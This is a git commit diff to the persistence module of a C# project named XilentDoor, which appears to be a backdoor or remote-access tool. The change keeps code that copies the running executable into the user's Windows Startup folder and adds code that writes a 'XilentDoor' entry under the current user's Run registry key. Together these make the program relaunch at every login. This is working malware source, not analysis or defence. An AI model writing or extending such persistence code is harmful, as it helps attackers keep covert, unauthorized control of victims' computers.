365f9a4775ce6878072adb67516f95b1f9381650
R3LI4NT <75953873+R3LI4NT@users.noreply.github.com>
2025-10-25 17:16:56 -0300

    Update Persistence.cs

--- Core/Persistence.cs
+++ Core/Persistence.cs
@@ -1,5 +1,6 @@
 using System;
 using System.IO;
+using Microsoft.Win32;
 
 namespace XilentDoor.Core
 {
@@ -11,19 +12,32 @@ namespace XilentDoor.Core
             {
                 string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
 
+                // Copia el archivo .exe al directorio de inicio
                 string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                 string startupFolder = Path.Combine(userProfile, @"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
-
                 string destFile = Path.Combine(startupFolder, Path.GetFileName(exePath));
 
                 if (!File.Exists(destFile))
                 {
                     File.Copy(exePath, destFile);
                 }
+
+                // Agrega entrada al registro de Windows
+                string registryPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
+                string registryName = "XilentDoor";
+
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryPath, true))
+                {
+                    if (key != null)
+                    {
+                        key.SetValue(registryName, exePath);
+                    }
+                }
             }
             catch (Exception ex)
             {
-                // Manejar errores ?
+                // Manejar errores
+                Console.WriteLine($"[!] Error al establecer persistencia: {ex.Message}");
             }
         }
     }
